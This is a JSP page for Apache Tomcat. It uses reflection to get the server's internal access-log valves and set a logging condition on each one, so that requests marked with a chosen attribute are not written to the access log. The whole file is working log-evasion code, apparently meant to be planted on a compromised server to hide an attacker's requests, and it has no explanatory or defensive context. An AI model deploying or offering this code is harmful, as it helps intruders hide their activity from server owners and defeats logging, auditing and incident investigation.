<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.core.StandardHost" %>
<%@ page import="org.apache.catalina.AccessLog" %>
<%@ page import="org.apache.catalina.valves.AbstractAccessLogValve" %>
<%@ page import="org.apache.catalina.core.AccessLogAdapter" %>
<%
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    MappingData mappingData = req.getMappingData();
    StandardHost standardHost = (StandardHost) mappingData.host;
    AccessLogAdapter accessLogAdapter = (AccessLogAdapter) standardHost.getAccessLog();
    Field logsF = accessLogAdapter.getClass().getDeclaredField("logs");
    logsF.setAccessible(true);
    AccessLog[] logs = (AccessLog[])logsF.get(accessLogAdapter);
    for( AccessLog log:logs ){
    	((AbstractAccessLogValve)log).setCondition("WhatEverYouWant");//任意填入
	}
	request.setAttribute("WhatEverYouWant", "WhatEverYouWant");
%>

